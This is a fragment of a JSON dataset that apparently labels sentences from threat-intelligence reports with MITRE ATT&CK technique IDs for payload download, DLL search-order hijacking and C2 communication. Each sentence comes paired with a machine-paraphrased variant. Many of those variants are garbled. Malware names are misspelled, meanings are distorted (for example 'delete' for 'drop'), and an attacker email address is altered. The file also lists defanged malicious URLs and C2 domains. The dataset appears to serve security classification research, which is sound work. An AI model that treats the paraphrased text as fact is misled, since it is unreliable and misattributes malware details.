            "data_text": "Figure 8: Network communication downloading Pause.ps1 payload Zyklon Delivery In all of these technologies, the same domain is used to download the next level payload (Pause.ps1), another PowerShell script encoded in Base64 (see Figure 8)."
        }
    ],
    "I download my tools from GitHub, and so do my victims": [
        {
            "tec_id": "T1105",
            "en_text": "I download my tools from GitHub, and so do my victims",
            "data_text": "I downloaded the tools from GitHub, and my victims,"
        }
    ],
    "The “upload” command downloads files from the CnC and saves them locally in “C:\\ProgramData“": [
        {
            "tec_id": "T1105",
            "en_text": "The “upload” command downloads files from the CnC and saves them locally in “C:\\ProgramData“",
            "data_text": "The upload command downloads the file from CnC and saves it locally in \"C:\".\\ProgramData\""
        }
    ],
    "Additional information In the advanced stages of this research, we were able not only to observe additional files and tools from the attackers’ arsenal but also some OPSEC mistakes made by the attackers": [
        {
            "tec_id": "T1105",
            "en_text": "Additional information In the advanced stages of this research, we were able not only to observe additional files and tools from the attackers’ arsenal but also some OPSEC mistakes made by the attackers",
            "data_text": "Additional Information At the advanced stage of this study, we were able to observe some of the attacker's OPSEC mistakes, as well as additional files and tools from the attacker's arsenal."
        }
    ],
    "It will:  Download and execute the backdoor component Replace the content of the downloader Mach-O executable with a decoy, either using a base64-encoded embedded file or by downloading it from the internet Open a decoy document (described later) Close the Terminal window that just opened  The decoy document replaces the downloader Mach-O file, which means the malicious executable is only present in the ZIP file now": [
        {
            "tec_id": "T1105",
            "en_text": "It will:  Download and execute the backdoor component Replace the content of the downloader Mach-O executable with a decoy, either using a base64-encoded embedded file or by downloading it from the internet Open a decoy document (described later) Close the Terminal window that just opened  The decoy document replaces the downloader Mach-O file, which means the malicious executable is only present in the ZIP file now",
            "data_text": "Download and run Backdoor components Downloaders Use or replace the contents of the Mach-O executable with a built-in file encoded in default 64 (download from the Internet) Open this document (described later) Close this terminal window that you just opened. This document replaces the downloader Mach-O file.A ch means that the malicious executable is only in the current ZIP file."
        }
    ],
    "This file issued a GET request to download a malicious file from: hxxp://94.23.172.164/dupdatechecker.doc": [
        {
            "tec_id": "T1105",
            "en_text": "This file issued a GET request to download a malicious file from: hxxp://94.23.172.164/dupdatechecker.doc",
            "data_text": "This file issued a GET request to download a malicious file from hxxp://94.23.172.164/dupdatechecker.doc."
        }
    ],
    "As shown in Figure 12, the script within the dupatechecker.doc file attempts to download another file named dupatechecker.exe from the same server": [
        {
            "tec_id": "T1105",
            "en_text": "As shown in Figure 12, the script within the dupatechecker.doc file attempts to download another file named dupatechecker.exe from the same server",
            "data_text": "As shown in Figure 12, the script within the dupatechecker.doc file attempts to download another file called dupatechecker.exe from the same server."
        }
    ],
    "Anyconnect[.]stream Bigip[.]stream Fortiweb[.]download Kaspersky[.]science microtik[.]stream owa365[.]bid symanteclive[.]download windowsdefender[.]win  The listed C2 servers all resolved to IPs belonging to a service provider in China at 1.2.9.0/24, which is the IP address used by the C2 server to send a cancel communications message to the end system": [
        {
            "tec_id": "T1105",
            "en_text": "Anyconnect[.]stream Bigip[.]stream Fortiweb[.]download Kaspersky[.]science microtik[.]stream owa365[.]bid symanteclive[.]download windowsdefender[.]win  The listed C2 servers all resolved to IPs belonging to a service provider in China at 1.2.9.0/24, which is the IP address used by the C2 server to send a cancel communications message to the end system",
            "data_text": "Anyconnect[.stream Bigip[.stream Fortiweb[.download Kaspersky][.science microtik[.stream oa365[.bid simanteclive[.download windowsdefender[.win]]] All listed C2 servers were resolved to IP addresses belonging to service providers in China in 1.2.9.0/24.Stem."
        }
    ],
    "The .iqy files take advantage of Excel’s willingness to download and include the contents from a remote server in a spreadsheet": [
        {
            "tec_id": "T1105",
            "en_text": "The .iqy files take advantage of Excel’s willingness to download and include the contents from a remote server in a spreadsheet",
            "data_text": "The .iqi file leverages Excel's willingness to download and include content in a spreadsheet from a remote server."
        }
    ],
    "2 Downloads a file to the system": [
        {
            "tec_id": "T1105",
            "en_text": "2 Downloads a file to the system",
            "data_text": "2 Download the file to the system."
        }
    ],
    "Once the victim downloads and executes the email attachment, it runs silently with no additional decoy documents or decoy dialog boxes": [
        {
            "tec_id": "T1105",
            "en_text": "Once the victim downloads and executes the email attachment, it runs silently with no additional decoy documents or decoy dialog boxes",
            "data_text": "When the victim downloads and executes the email attachment, it runs automatically without any additional bait documents or bait dialogs."
        }
    ],
    "This includes, but is not limited to, the following:  AES encryption of network communication File management Functionality to download, upload, and execute files Keylogging Remote desktop access Remote webcam viewing Reverse proxy Browser and FTP client password recovery  The images below are what a target user opening a malicious RTF document would see from within Microsoft Word": [
        {
            "tec_id": "T1105",
            "en_text": "This includes, but is not limited to, the following:  AES encryption of network communication File management Functionality to download, upload, and execute files Keylogging Remote desktop access Remote webcam viewing Reverse proxy Browser and FTP client password recovery  The images below are what a target user opening a malicious RTF document would see from within Microsoft Word",
            "data_text": "This includes, but is not limited to: AES Encrypted File Management for Network Communications Keylogging Remote Desktop Access Remote Webcam View Reverse Proxy Browser and FTP Client Password Recovery The image below is an image of the target user who opens a malicious RTF document.ld see from Microsoft Word"
        }
    ],
    "13 Copy file to adbFle.tmp, and upload it to the C2": [
        {
            "tec_id": "T1105",
            "en_text": "13 Copy file to adbFle.tmp, and upload it to the C2",
            "data_text": "13 Copy the file to adbFle.tmp and upload it to C2."
        }
    ],
    "When opened and then executed, the key components of the HTA file downloads and executes further malware from a remote URLand loads a decoy image hosted externally (Figure 3)": [
        {
            "tec_id": "T1105",
            "en_text": "When opened and then executed, the key components of the HTA file downloads and executes further malware from a remote URLand loads a decoy image hosted externally (Figure 3)",
            "data_text": "When opened and then run, the main components of the HTA file download and run additional malware from the remote URL and load an externally hosted bait image (Figure 3)."
        }
    ],
    "Both responses instruct the malware to download and load a remote plugin": [
        {
            "tec_id": "T1105",
            "en_text": "Both responses instruct the malware to download and load a remote plugin",
            "data_text": "Both responses instruct the malware to download and load the remote plug-in."
        }
    ],
    "During a file analysis of PLAINTEE in WildFire, we observed the attackers download and execute a plugin during the runtime for that sample": [
        {
            "tec_id": "T1105",
            "en_text": "During a file analysis of PLAINTEE in WildFire, we observed the attackers download and execute a plugin during the runtime for that sample",
            "data_text": "During WildFire's analysis of PLARTEE files, you observed an attacker downloading and running the plug-in during the runtime of the sample."
        }
    ],
    "Most of them manipulate the machine to download and execute different files": [
        {
            "tec_id": "T1105",
            "en_text": "Most of them manipulate the machine to download and execute different files",
            "data_text": "Most of them operate the machine to download and run other files."
        }
    ],
    "Use of PowerShell to download additional tools": [
        {
            "tec_id": "T1105",
            "en_text": "Use of PowerShell to download additional tools",
            "data_text": "Download additional tools using PowerShell"
        }
    ],
    "The purpose is to download and execute an additional payload hosted on a compromised website: NavRAT": [
        {
            "tec_id": "T1105",
            "en_text": "The purpose is to download and execute an additional payload hosted on a compromised website: NavRAT",
            "data_text": "The purpose is to download and run additional payloads hosted on a compromised website. NavRAT"
        }
    ],
    "NavRAT is able to download and execute files located in the attachment of a received email": [
        {
            "tec_id": "T1105",
            "en_text": "NavRAT is able to download and execute files located in the attachment of a received email",
            "data_text": "NavRAT can download and run files in attachments to received email."
        }
    ],
    "The shellcode of the embedded object is designed to download an image, which is, in fact, a new shellcode used to decode an embedded executable": [
        {
            "tec_id": "T1105",
            "en_text": "The shellcode of the embedded object is designed to download an image, which is, in fact, a new shellcode used to decode an embedded executable",
            "data_text": "The shell code for embedded objects is designed to download images, which is actually a new shell code used to decode embedded executables."
        }
    ],
    "Figure 2 SYSCON network traffic witnessed during execution   Pivoting on the domain hosting the SYSCON sample, 881.000webhostapp[.]com, revealed a number of additional samples, including a sample of the KONNI malware family, and four 64-bit executable files belonging to the CARROTBAT malware family": [
        {
            "tec_id": "T1105",
            "en_text": "Figure 2 SYSCON network traffic witnessed during execution   Pivoting on the domain hosting the SYSCON sample, 881.000webhostapp[.]com, revealed a number of additional samples, including a sample of the KONNI malware family, and four 64-bit executable files belonging to the CARROTBAT malware family",
            "data_text": "Figure 2 As a result of pivoting from the domain hosting the SYSCON network traffic SYSCON sample (881.000 webhostapp[.com]) witnessed during execution, a number of additional samples were found, including four 64-bit executables belonging to the KONNI malware family and CARROBAT malware family."
        }
    ],
    "CARROTBAT itself is a dropper that allows an attacker to drop and open an embedded decoy file, followed by the execution of a command that will download and run a payload on the targeted machine": [
        {
            "tec_id": "T1105",
            "en_text": "CARROTBAT itself is a dropper that allows an attacker to drop and open an embedded decoy file, followed by the execution of a command that will download and run a payload on the targeted machine",
            "data_text": "CARROBAT itself is a dropper that allows an attacker to delete and open embedded bait files, and then executes commands to download and execute payloads on the target system."
        }
    ],
    "Delivery document The delivery document contains a macro that downloads an executable from a remote server": [
        {
            "tec_id": "T1105",
            "en_text": "Delivery document The delivery document contains a macro that downloads an executable from a remote server",
            "data_text": "Delivery documents A delivery document contains a macro that downloads executables from a remote server."
        }
    ],
    "Command_Down_exec: This command downloads and executes new modules.  It takes a url as the argument and uses that to download and execute files": [
        {
            "tec_id": "T1105",
            "en_text": "Command_Down_exec: This command downloads and executes new modules.  It takes a url as the argument and uses that to download and execute files",
            "data_text": "Command_Down_exec: This command downloads and executes the new module. Download and run the file using the URL as an argument."
        }
    ],
    "Its presence on a compromised system allows a threat actor to spawn a reverse shell, upload or download files, and capture keystrokes": [
        {
            "tec_id": "T1105",
            "en_text": "Its presence on a compromised system allows a threat actor to spawn a reverse shell, upload or download files, and capture keystrokes",
            "data_text": "Security threat actors can create reverse shells, upload or download files, and capture keystrokes because security threats exist on compromised systems."
        }
    ],
    "After reestablishing access, the adversaries download tools such as gsecudmp and WCE that are staged temporarily on websites that TG-3390 previously compromised but never used": [
        {
            "tec_id": "T1105",
            "en_text": "After reestablishing access, the adversaries download tools such as gsecudmp and WCE that are staged temporarily on websites that TG-3390 previously compromised but never used",
            "data_text": "After re-establishing access, adversaries download tools such as gsecudmp and WCE that have been temporarily prepared to websites that have previously damaged TG-3390, but have never been used."
        }
    ],
    "The OwaAuth web shell enables a threat actor to upload and download files, launch processes, and execute SQL queries": [
        {
            "tec_id": "T1105",
            "en_text": "The OwaAuth web shell enables a threat actor to upload and download files, launch processes, and execute SQL queries",
            "data_text": "The OwaAuth web shell allows threat actors to upload and download files, run processes, and run SQL queries."
        }
    ],
    "The script self-scheduling, as well as the scheduling of a script that repeatedly attempts to download and execute the Revenge RAT binary, significantly contribute to the persistence of this infection": [
        {
            "tec_id": "T1105",
            "en_text": "The script self-scheduling, as well as the scheduling of a script that repeatedly attempts to download and execute the Revenge RAT binary, significantly contribute to the persistence of this infection",
            "data_text": "Scheduling scripts themselves and scheduling scripts that repeatedly attempt to download and run RAT binaries contribute significantly to the persistence of this infection."
        }
    ],
    "A backdoor that communicates with a single command and control (C2) server using HTTP GET and POST requests, TONEDEAF supports collecting system information, uploading and downloading of files, and arbitrary shell command execution.": [
        {
            "tec_id": "T1105",
            "en_text": "A backdoor that communicates with a single command and control (C2) server using HTTP GET and POST requests, TONEDEAF supports collecting system information, uploading and downloading of files, and arbitrary shell command execution.",
            "data_text": "TONEDEAF, a backdoor that uses HTTP GET and POST requests to communicate with a single C2 server, helps collect system information, upload and download files, and execute arbitrary shell commands."
        }
    ],
    "We found a mechanism for decrypting, executing, and downloading an additional payload from the C&C server.": [
        {
            "tec_id": "T1105",
            "en_text": "We found a mechanism for decrypting, executing, and downloading an additional payload from the C&C server.",
            "data_text": "C found a mechanism to decrypt, execute, and download additional payloads."
        }
    ],
    "certutil is a WIndows component that can download external content to the computer. In a typical attack, the criminals follow this paradigm": [
        {
            "tec_id": "T1105",
            "en_text": "certutil is a WIndows component that can download external content to the computer. In a typical attack, the criminals follow this paradigm",
            "data_text": "certil is a Windows component that allows you to download external content to your computer. In a typical attack, criminals follow this paradigm."
        }
    ],
    "The SQLRat script is designed to make a direct SQL connection to a Microsoft database controlled by the attackers and execute the contents of various tables": [
        {
            "tec_id": "T1105",
            "en_text": "The SQLRat script is designed to make a direct SQL connection to a Microsoft database controlled by the attackers and execute the contents of various tables",
            "data_text": "The SQLRat script is designed to connect SQL directly to a Microsoft database controlled by an attacker and run the contents of various tables."
        }
    ],
    "The backdoor has the capability to download and upload files, execute shell commands, and update its configuration.": [
        {
            "tec_id": "T1105",
            "en_text": "The backdoor has the capability to download and upload files, execute shell commands, and update its configuration.",
            "data_text": "The backdoor has the ability to download and upload files, run shell commands, and update configurations."
        }
    ],
    "BUGJUICE is a backdoor that is executed by launching a benign file and then hijacking the search order to load a malicious dll into it": [
        {
            "tec_id": "T1574.001",
            "en_text": "BUGJUICE is a backdoor that is executed by launching a benign file and then hijacking the search order to load a malicious dll into it",
            "data_text": "BUGJUICE is a backdoor that runs by starting a positive file to load malicious dll and then intercepting the search order."
        }
    ],
    "This most likely means there is some type of DLL hijacking going on by distributing a legitimate McAfee binary with MirageFox to load up the DLL properly into a legitimate looking process": [
        {
            "tec_id": "T1574.001",
            "en_text": "This most likely means there is some type of DLL hijacking going on by distributing a legitimate McAfee binary with MirageFox to load up the DLL properly into a legitimate looking process",
            "data_text": "This means that DLL intercepts are in progress of some types of DLL intercepts by deploying legitimate McAfee binaries with MirageFox to properly load the DLLs into the correct shape process."
        }
    ],
    "Whitefly has consistently used a technique known as search order hijacking to run Vcrodat.": [
        {
            "tec_id": "T1574.001",
            "en_text": "Whitefly has consistently used a technique known as search order hijacking to run Vcrodat.",
            "data_text": "Whitefly has consistently run Vcrodat using a technique called search order hijacking."
        }
    ],
    "Attackers can therefore give a malicious DLL the same name as a legitimate DLL but place it ahead of the legitimate version in the search order so that it will be loaded when Windows searches for it.": [
        {
            "tec_id": "T1574.001",
            "en_text": "Attackers can therefore give a malicious DLL the same name as a legitimate DLL but place it ahead of the legitimate version in the search order so that it will be loaded when Windows searches for it.",
            "data_text": "Therefore, an attacker can give a malicious DLL the same name as a legitimate DLL, but can place it before a legitimate DLL in the search order so that it is loaded when Windows scans."
        }
    ],
    "Nibatad is also a loader that leverages search order hijacking, and downloads an encrypted payload to the infected computer.": [
        {
            "tec_id": "T1574.001",
            "en_text": "Nibatad is also a loader that leverages search order hijacking, and downloads an encrypted payload to the infected computer.",
            "data_text": "Nibatad is also a loader that uses the search sequence hijack to download encrypted payloads to infected computers."
        }
    ],
    "BUGJUICE defaults to TCP using a custom binary protocol to communicate with the C2, but can also use HTTP and HTTPs if directed by the C2": [
        {
            "tec_id": "T1071",
            "en_text": "BUGJUICE defaults to TCP using a custom binary protocol to communicate with the C2, but can also use HTTP and HTTPs if directed by the C2",
            "data_text": "BUGJUICE defaults to TCP, which uses a custom binary protocol to communicate with C2, but HTTP and HTTP are also available when directed by C2."
        }
    ],
    "SNUGRIDE is a backdoor that communicates with its C2 server through HTTP requests": [
        {
            "tec_id": "T1071",
            "en_text": "SNUGRIDE is a backdoor that communicates with its C2 server through HTTP requests",
            "data_text": "SNUGGRIDE is a backdoor that communicates with the C2 server through HTTP requests."
        }
    ],
    "We mentioned earlier that due to the nature of the IE injection technique used by the HTTP-based backdoors, a number of C2 commands were cached to disk": [
        {
            "tec_id": "T1071",
            "en_text": "We mentioned earlier that due to the nature of the IE injection technique used by the HTTP-based backdoors, a number of C2 commands were cached to disk",
            "data_text": "We previously mentioned that many C2 commands were cached on disk due to the nature of IE injection techniques used in HTTP-based backdoor."
        }
    ],
    "And, according to the collected config files, the group upgraded their malware communications from plain text http to encrypted https in October 2013": [
        {
            "tec_id": "T1071",
            "en_text": "And, according to the collected config files, the group upgraded their malware communications from plain text http to encrypted https in October 2013",
            "data_text": "And according to the collected configuration files, the group upgraded malware communications from plaintext http to encrypted https in October 2013."
        }
    ],
    "Figure 1: Configuration file that adds new C2 server and forces the data-stealing backdoor to use it   Figure 2: Configuration file that adds TCP tunnels and records desktop video Command and Control CARBANAK communicates to its C2 servers via pseudo-HTTP or a custom binary protocol": [
        {
            "tec_id": "T1071",
            "en_text": "Figure 1: Configuration file that adds new C2 server and forces the data-stealing backdoor to use it   Figure 2: Configuration file that adds TCP tunnels and records desktop video Command and Control CARBANAK communicates to its C2 servers via pseudo-HTTP or a custom binary protocol",
            "data_text": "Figure 1: Configuration file that adds a new C2 server and forces the backdoor to steal data Figure 2: Configuration file that adds a TCP tunnel and logs desktop video commands and control CARBANK communicates with the C2 server via pseudo HTTP or custom binary protocols."
        }
    ],
    "Pseudo-HTTP Protocol Messages for the pseudo-HTTP protocol are delimited with the ‘|’ character": [
        {
            "tec_id": "T1071",
            "en_text": "Pseudo-HTTP Protocol Messages for the pseudo-HTTP protocol are delimited with the ‘|’ character",
            "data_text": "Similar HTTP protocol messages for similar HTTP protocols are separated by a '|' character."
        }
    ],
    "We recently mentioned this tool in another report on April 16, as this variant of the BONDUPDATER tool used DNS tunneling to communicate with its C2, specifically using TXT queries to receive information from the C2 server": [
        {
            "tec_id": "T1071",
            "en_text": "We recently mentioned this tool in another report on April 16, as this variant of the BONDUPDATER tool used DNS tunneling to communicate with its C2, specifically using TXT queries to receive information from the C2 server",
            "data_text": "Since this variant of the BONDUPDATER tool uses DNS tunneling to communicate with C2, and in particular receives information from C2 servers using TXT queries, we recently mentioned this tool in another report on April 16."
        }
    ],
    "Server Command and control server that communicates via DNS tunneling   Panel Graphical User Interface that allows actors to issue commands, upload and download files to Agents via the Server    Table 2": [
        {
            "tec_id": "T1071",
            "en_text": "Server Command and control server that communicates via DNS tunneling   Panel Graphical User Interface that allows actors to issue commands, upload and download files to Agents via the Server    Table 2",
            "data_text": "Server commands and control servers communicating through the DNS tunneling panel graphical user interface, which allows operators to issue commands to agents and upload and download files through Server Table 2."
        }
    ],
    "The Poison Frog server handles both the HTTP and DNS tunneling channels used by the hUpdater.ps1 and dUpdater.ps1 scripts": [
        {
            "tec_id": "T1071",
            "en_text": "The Poison Frog server handles both the HTTP and DNS tunneling channels used by the hUpdater.ps1 and dUpdater.ps1 scripts",
            "data_text": "The Poison Frog server handles both HTTP and DNS tunneling channels used by the hUpdater.ps1 and dUpdater.ps1 scripts."
        }
    ],
    "Its C2 is based on IIS using .asp technology to handle the victims’ HTTP requests": [
        {
            "tec_id": "T1071",
            "en_text": "Its C2 is based on IIS using .asp technology to handle the victims’ HTTP requests",
            "data_text": "Its C2 is based on IIS, which uses .asp technology to process victims' HTTP requests."
        }
    ],
    "The example C2s used by older variants of Comnie demonstrates this:  Figure 9 Old Comnie variants collecting C2 information Please refer to the Appendix for a script that may be used to decode C2 information from the older Comnie variants": [
        {
            "tec_id": "T1071",
            "en_text": "The example C2s used by older variants of Comnie demonstrates this:  Figure 9 Old Comnie variants collecting C2 information Please refer to the Appendix for a script that may be used to decode C2 information from the older Comnie variants",
            "data_text": "Examples of C2 used by previous versions of Comnie are as follows. Figure 9 Previous Comnie Variations Collecting C2 Information See Appendix for scripts that can be used to decode C2 information from previous Comnie Variations."
        }
    ],
    "After Comnie collects the remote C2 information, it will communicate with these remote servers using HTTP requests": [
        {
            "tec_id": "T1071",
            "en_text": "After Comnie collects the remote C2 information, it will communicate with these remote servers using HTTP requests",
            "data_text": "Comnie collects remote C2 information and uses HTTP requests to communicate with these remote servers."
        }
    ],
    "The URIs used in the HTTP requests are randomly generated": [
        {
            "tec_id": "T1071",
            "en_text": "The URIs used in the HTTP requests are randomly generated",
            "data_text": "The URI used in the HTTP request is randomly generated."
        }
    ],
    "Table 2 Sandbox evasion checks in the C# variant of RogueRobin Like the original version, the C# variant of RogueRobin uses DNS tunneling to communicate with its C2 server using a variety of different DNS query types": [
        {
            "tec_id": "T1071",
            "en_text": "Table 2 Sandbox evasion checks in the C# variant of RogueRobin Like the original version, the C# variant of RogueRobin uses DNS tunneling to communicate with its C2 server using a variety of different DNS query types",
            "data_text": "Table 2 Check sandbox avoidance of Rogue Robin's C# variants Similar to the original version, Rogue Robin's C# variants communicate with the C2 server using various DNS query types."
        }
    ],
    "Figure 2 Code that issues DNS query to gogle.co if a debugger is detected All DNS requests issued by RogueRobin use the built in nslookup.exe application to communicate to the C2 server and the Trojan will use a variety of regular expressions to extract data from the DNS response": [
        {
            "tec_id": "T1071",
            "en_text": "Figure 2 Code that issues DNS query to gogle.co if a debugger is detected All DNS requests issued by RogueRobin use the built in nslookup.exe application to communicate to the C2 server and the Trojan will use a variety of regular expressions to extract data from the DNS response",
            "data_text": "Figure 2 When a debugger is detected, all DNS requests issued by Rogue Robin, which issues DNS queries to gogle.co, communicate with the C2 server using the built-in nslookup.exe application, and the Trojans extract data from DNS responses using various regular expressions."
        }
    ],
    "Character  Digit   h 0   i 1   j 2   k 3   l 4   m 5   n 6   o 7   p 8   q 9    Table 4 Character substitution used in RogueRobin The Trojan will use future DNS requests to retrieve jobs from the C2 server, which the Trojan will handle as commands": [
        {
            "tec_id": "T1071",
            "en_text": "Character  Digit   h 0   i 1   j 2   k 3   l 4   m 5   n 6   o 7   p 8   q 9    Table 4 Character substitution used in RogueRobin The Trojan will use future DNS requests to retrieve jobs from the C2 server, which the Trojan will handle as commands",
            "data_text": "The character replacement Trojan used in the character number 0i1 j 2k 3l 4m 5n 6o 7p 8q 9 Table 4 uses future DNS requests to retrieve tasks from the C2 server. This is handled by the Trojan Horse as a command."
        }
    ],
    "The x_mode command is disabled by default, but when enabled via a command received from the DNS tunneling channel, it allows RogueRobin to receive a unique identifier and to get jobs by using Google Drive API requests": [
        {
            "tec_id": "T1071",
            "en_text": "The x_mode command is disabled by default, but when enabled via a command received from the DNS tunneling channel, it allows RogueRobin to receive a unique identifier and to get jobs by using Google Drive API requests",
            "data_text": "The x_mode command is disabled by default, but when enabled via commands received from a DNS tunneling channel, Rogue Robin can receive a unique identifier and obtain operations using Google Drive API requests."
        }
    ],
    "Background From October 2012 to May 2014, FireEye observed APT12 utilizing RIPTIDE, a proxy-aware backdoor that communicates via HTTP to a hard-coded command and control (C2) server": [
        {
            "tec_id": "T1071",
            "en_text": "Background From October 2012 to May 2014, FireEye observed APT12 utilizing RIPTIDE, a proxy-aware backdoor that communicates via HTTP to a hard-coded command and control (C2) server",
            "data_text": "Background From October 2012 to May 2014, FireEye observed APT12 using RIPTIDE, a proxy-aware backdoor that communicates with hard-coded command and control (C2) servers over HTTP."
        }
    ],
    "If you compare the HTTP GET request from the RIPTIDE samples (Figure 1) to the HTTP GET request from the HIGHTIDE samples (Figure 3) you can see the malware author changed the following items:  User Agent Format and structure of the HTTP Uniform Resource Identifier (URI)   Figure 3: HIGHTIDE GET Request Example Similar to RIPTIDE campaigns, APT12 infects target systems with HIGHTIDE using a Microsoft Word (.doc) document that exploits CVE-2012-0158": [
        {
            "tec_id": "T1071",
            "en_text": "If you compare the HTTP GET request from the RIPTIDE samples (Figure 1) to the HTTP GET request from the HIGHTIDE samples (Figure 3) you can see the malware author changed the following items:  User Agent Format and structure of the HTTP Uniform Resource Identifier (URI)   Figure 3: HIGHTIDE GET Request Example Similar to RIPTIDE campaigns, APT12 infects target systems with HIGHTIDE using a Microsoft Word (.doc) document that exploits CVE-2012-0158",
            "data_text": "Comparing the HTTP GET request in the RIPTIDE sample (Figure 1) with the HTTP GET request in the HIGHTIDE sample (Figure 3), you can see that the malware author has made the following changes: User agent format and structure of HTTP Uniform Resource Identifier (URI) Figure 3: APT12 similar to the HIGHIDE GET request example RIPTIDE campaign uses a Microsoft Word (.doc) document using CVE-2012-0158 to infect the target system with HIGHIDE."
        }
    ],
    "Similar to RIPTIDE and HIGHTIDE, the WATERSPOUT backdoor is an HTTP-based backdoor that communicates with its C2 server": [
        {
            "tec_id": "T1071",
            "en_text": "Similar to RIPTIDE and HIGHTIDE, the WATERSPOUT backdoor is an HTTP-based backdoor that communicates with its C2 server",
            "data_text": "Similar to RIPTIDE and HIGHIDE, the WATERSPOUT backdoor is an HTTP-based backdoor that communicates with the C2 server."
        }
    ],
    "11/1/18 sahro.bella7 trala.cosh2 Bishtr.cam47 Lobrek.chizh Cervot.woprov    Table 5 Gathered C# Cannon samples As mentioned in our initial blog, the actor controlled email address acting as the C2 was sahro.bella7[at]post.cz, but all previous samples of Cannon used sym777.g[at]post.cz": [
        {
            "tec_id": "T1071",
            "en_text": "11/1/18 sahro.bella7 trala.cosh2 Bishtr.cam47 Lobrek.chizh Cervot.woprov    Table 5 Gathered C# Cannon samples As mentioned in our initial blog, the actor controlled email address acting as the C2 was sahro.bella7[at]post.cz, but all previous samples of Cannon used sym777.g[at]post.cz",
            "data_text": "11/1/18 sahro.bella7trala.cosh2 Bishtr.cam47 Lobrek.chizh Cervot.woprov Table 5 As mentioned in the initial blog of collecting C# Cannon samples, the actor who acts as C2 controlled the email address to sahro.207[at]post.cz, but all previous samples from Cannon were used."
        }
    ],
    "Even though Delphi Cannon uses POP3S and SMTPS for its C2 communications like Cannon, it is arguably easier to defend against as it uses an actor owned domain that defenders can easily block and not a legitimate email provider such as Seznam": [
        {
            "tec_id": "T1071",
            "en_text": "Even though Delphi Cannon uses POP3S and SMTPS for its C2 communications like Cannon, it is arguably easier to defend against as it uses an actor owned domain that defenders can easily block and not a legitimate email provider such as Seznam",
            "data_text": "Delphi Cannon uses POP3S and SMTPS for C2 communications such as Cannon, but is much easier to defend because it uses actor-owned domains that are easily blocked by defenders rather than legitimate email providers such as Seznam."
        }
    ],
    "The screenshot in Figure 8 of the inf method within a Cannon sample (SHA256: 4405cfbf28…) shows the information gathered that is exfiltrated to the C2 via email, specifically with RunningPlace and LogicalDrives header strings:  Figure 8 inf method used by Cannon When comparing the two Cannon variants, we found a method within a Delphi Cannon sample (SHA256: 5a02d4e5f6…) showing the use of Running place and Logical_Drivers as header strings to the system information it is collecting and sending to the C2 via email": [
        {
            "tec_id": "T1071",
            "en_text": "The screenshot in Figure 8 of the inf method within a Cannon sample (SHA256: 4405cfbf28…) shows the information gathered that is exfiltrated to the C2 via email, specifically with RunningPlace and LogicalDrives header strings:  Figure 8 inf method used by Cannon When comparing the two Cannon variants, we found a method within a Delphi Cannon sample (SHA256: 5a02d4e5f6…) showing the use of Running place and Logical_Drivers as header strings to the system information it is collecting and sending to the C2 via email",
            "data_text": "Screenshot of inf method Figure 8 in Cannon sample (SHA256:4405cfbf28…)) shows the collected information leaked to C2 via email. Specifically, using the RunningPlace and LogicalDrives header strings: Figure 8 When comparing two Cannon variants of the inf method used by Cannon, a Delphi Cannon sample (SHA256:5a02d4e5f6…)) found a way to send Runningplace and Logical_Drivers to C2 via email using the header string."
        }
    ],
    "The shellcode retrieves an additional payload by connecting to the following C2 server using DNS: aaa.stage.14919005.www1.proslr3[.]com Once a successful reply is received from the command and control (C2) server, the PowerShell script executes the embedded Cobalt Strike shellcode": [
        {
            "tec_id": "T1071",
            "en_text": "The shellcode retrieves an additional payload by connecting to the following C2 server using DNS: aaa.stage.14919005.www1.proslr3[.]com Once a successful reply is received from the command and control (C2) server, the PowerShell script executes the embedded Cobalt Strike shellcode",
            "data_text": "The shell code uses DNS:aaa.stage to connect to the following C2 servers to retrieve additional payloads:Upon receiving a successful response from the 14919005.www1.proslr3[.com command and control (C2) server, the PowerShell script executes the embedded cobalt strike shell code."
        }
    ],
    "Later variants upload the file to a web server via an HTTP post command": [
        {
            "tec_id": "T1071",
            "en_text": "Later variants upload the file to a web server via an HTTP post command",
            "data_text": "Subsequent variants upload files to the web server via the HTTP post command."
        }
    ],
    "Retriever uses .NET web services and the SoapHttpClientProtocol class to communicate with its C2 server, which generates HTTP requests resembling the example request in Figure 4": [
        {
            "tec_id": "T1071",
            "en_text": "Retriever uses .NET web services and the SoapHttpClientProtocol class to communicate with its C2 server, which generates HTTP requests resembling the example request in Figure 4",
            "data_text": "The Finder uses it.NET Web service and SoapHttpClientProtocol class to communicate with the C2 server that generates HTTP requests similar to the example requests in Figure 4"
        }
    ],
    "The shellcode executed by this command is the same as in the delivery documents as well, specifically taken from Metasploit to obtain additional shellcode to execute using an HTTP request to the following URL: http://www7.chrome-up[.]date/0m5EE We are unsure of the shellcode hosted at this URL, as we were unable to coerce the C2 server to provide a payload": [
        {
            "tec_id": "T1071",
            "en_text": "The shellcode executed by this command is the same as in the delivery documents as well, specifically taken from Metasploit to obtain additional shellcode to execute using an HTTP request to the following URL: http://www7.chrome-up[.]date/0m5EE We are unsure of the shellcode hosted at this URL, as we were unable to coerce the C2 server to provide a payload",
            "data_text": "The shell code executed by this command is the same as in the delivery document, especially from Metasploit to obtain additional shell codes to execute using HTTP requests for the following URL: http://www7.chrome-up[.date/0m5EE] The shell code hosted at this URL is unknown. This is because it cannot be forced to provide to the C2 server. a load carrying capacity"
        }
    ],
    "Once these variables are set, the malware uses the SoapHttpClientProtocol class to communicate with its C2 server, which issues an HTTP POST requests that appears as:  As you can see from the above request, the SoapHttpClientProtocol class neatly structures data into an HTTP POST request": [
        {
            "tec_id": "T1071",
            "en_text": "Once these variables are set, the malware uses the SoapHttpClientProtocol class to communicate with its C2 server, which issues an HTTP POST requests that appears as:  As you can see from the above request, the SoapHttpClientProtocol class neatly structures data into an HTTP POST request",
            "data_text": "When these variables are set, the malware uses the SoapHttpClientProtocol class to communicate with the C2 server. The C2 server executes the following HTTP POST requests: As you can see from the request above, the SoapHttpClientProtocol class neatly organizes the data into HTTP POST requests."
        }
    ],
    "All subsequent interaction with the C2 server uses the same SOAP web service, so we will not show all of the generated HTTP requests": [
        {
            "tec_id": "T1071",
            "en_text": "All subsequent interaction with the C2 server uses the same SOAP web service, so we will not show all of the generated HTTP requests",
            "data_text": "All subsequent interactions with the C2 server use the same SOAP web service and do not display some of the HTTP requests generated."
        }
    ],
    "Figure 9: Command logs after execution Network Communications FELIXROOT communicates with its C2 via HTTP and HTTPS POST protocols": [
        {
            "tec_id": "T1071",
            "en_text": "Figure 9: Command logs after execution Network Communications FELIXROOT communicates with its C2 via HTTP and HTTPS POST protocols",
            "data_text": "Figure 9: After execution, command log network communication FELEXROOT communicates with C2 via HTTP and HTTPS POST protocols."
        }
    ],
